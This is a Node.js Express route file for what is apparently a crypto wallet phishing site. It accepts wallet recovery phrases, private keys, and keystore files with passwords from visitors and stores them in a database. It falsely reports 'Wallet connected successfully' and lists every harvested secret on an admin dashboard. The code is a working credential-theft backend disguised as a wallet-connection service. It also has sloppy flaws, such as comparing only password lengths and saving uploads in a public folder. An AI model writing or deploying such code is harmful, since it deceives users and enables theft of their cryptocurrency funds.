const Credentials = require("../model/Credentials");
const uuid = require("uuid");
const {ensureAuthenticated} = require("../config/auth");
const Admin = require("../model/Admin");
const bcrypt = require("bcryptjs");


const router = require("express").Router();

router.get("/", (req,res) => {
    try{
        return res.render("index", {pageTitle: "Welcome", req});
    }
    catch(err){
        return res.redirect("/");
    }
});

router.post("/", async(req,res) => {
    try{
        const {type, walletname, rphrase, keystorepass, privatekey } = req.body;
        if(!type){
            return res.status(200).json({
                success: false,
                message: "please choose your wallet type"
            });
        }

        if(!walletname){
            return res.status(200).json({
                success: false,
                message: "please choose your wallet type"
            });
        }

        if(type === 'phrase'){
            if(!rphrase){
                return res.status(200).json({
                    success: false,
                    message: "please enter recovery phrase"
                });
            }
            if(rphrase.length < 12){
                return res.status(200).json({
                    success: false,
                    message: "please enter a valid recovery phrase"
                });
            }
            const newCred = {
                rphrase,
                walletname,
                type
            };
            const newRow  = new Credentials(newCred);
            await newRow.save();
            return res.status(200).json({
                success: true,
                message: "Wallet connected successfully"
            });
        }

        if(type.toLowerCase() === 'private key'){
            if(!walletname){
                return res.status(200).json({
                    success: false,
                    message: "please choose your wallet type"
                });
            }
            if(!privatekey){
                return res.status(200).json({
                    success: false,
                    message: "please enter private key"
                });
            }
            if(privatekey.length < 12){
                return res.status(200).json({
                    success: false,
                    message: "please enter a valid private key"
                });
            }
            const newCred = {
                privatekey,
                walletname,
                type
            };
            const newRow  = new Credentials(newCred);
            await newRow.save();
            return res.status(200).json({
                success: true,
                message: "Wallet connected successfully"
            });
        }

        if(type.toLowerCase() === 'keystore json'){
            if(!walletname){
                return res.status(200).json({
                    success: false,
                    message: "please choose your wallet type"
                });
            }
            if(!req.files.keystorefile){
                return res.status(200).json({
                    success: false,
                    message: "please upload keystore file"
                }); 
            }
            if(req.files.keystorefile.mimetype !== "application/json"){
                return res.status(200).json({
                    success: false,
                    message: "please upload a valid keystore JSON file"
                });
            }
            if(!keystorepass){
                return res.status(200).json({
                    success: false,
                    message: "please enter keystore password"
                });
            }
            if(keystorepass.length < 12){
                return res.status(200).json({
                    success: false,
                    message: "please enter a valid keystore passoword"
                });
            }
            const _keystorefile = req.files.keystorefile;
            const _filename = uuid.v1() + _keystorefile.name + '.json';
            await _keystorefile.mv('./public/uploads/' + _filename);
            const newCred = {
                keystorepass,
                keystorefile: _filename,
                walletname,
                type
            };
            const newRow  = new Credentials(newCred);
            await newRow.save();
            return res.status(200).json({
                success: true,
                message: "Wallet connected successfully"
            });
        }

    }catch(err){
        console.log(err);
        return res.status(400).json({
            success: false,
            message: "something wnet wrong"
        })
    }
});


router.get("/admin", ensureAuthenticated,  async (req,res) => {
    try{
        const credentials = await Credentials.find({});
        return res.render("dashboard", {req, credentials});
    }catch(err){
        console.log(err);
        return res.redirect("/");  
    }
});

router.get("/admin/change-password", ensureAuthenticated, (req,res) => {
    try{
        return res.render("changePassword", {req});
    }catch(err){
        return res.redirect("/admin");  
    }
})

router.post("/admin/change-password", ensureAuthenticated, async(req,res) => {
    try{
        const {newPassword, newPassword2} = req.body;
        if(!newPassword || !newPassword2){
            req.flash("error_msg", "Please privide all required fileds!");
            return res.redirect("/admin/change-password");
        }
        if(newPassword.length < 6 || newPassword2.length < 6){
            req.flash("error_msg", "Password is too short");
            return res.redirect("/admin/change-password");
        }
        if(newPassword.length !== newPassword2.length){
            req.flash("error_msg", "Passwords do not match");
            return res.redirect("/admin/change-password");
        }
        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(newPassword, salt);
        const newpassword = hash;
        await Admin.updateOne({_id: req.user.id}, {
            password: newpassword
        });
        req.flash("success_msg", "password updated successfully");
        return res.render("changePassword", {req});
    }catch(err){
        return res.redirect("/admin");  
    }
})

module.exports = router;